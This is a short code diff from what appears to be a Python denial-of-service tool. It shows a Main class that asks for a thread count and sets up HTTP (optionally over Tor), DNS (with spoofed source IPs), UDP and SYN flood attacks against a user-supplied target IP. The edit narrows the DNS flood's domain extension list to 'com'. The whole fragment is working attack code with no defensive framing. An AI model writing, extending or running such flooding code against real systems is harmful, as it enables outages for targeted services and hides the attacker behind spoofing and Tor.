@@ -115,7 +115,8 @@ class Main:
         thread_count = int(input("Enter number of threads per attack: "))
 
         http_flood = HttpFlood(target_ip, 80, self.use_tor)
-        extensions = ["com", "xyz", "me", "top", "id", "net", "org", "info"]
+       # extensions = ["com", "xyz", "me", "top", "id", "net", "org", "info"]
+        extensions = ["com"]
         dns_flood = DnsFlood(target_ip, 53, extensions, max_packets=50000, max_duration=30, interval_range=(0.01, 0.1), log_to_file=True, spoof_ip=True)
         udp_flood = UdpFlood(target_ip, 53, packet_size=6024)
         syn_flood = SynFlood(target_ip, 53, 10000, 0.1)
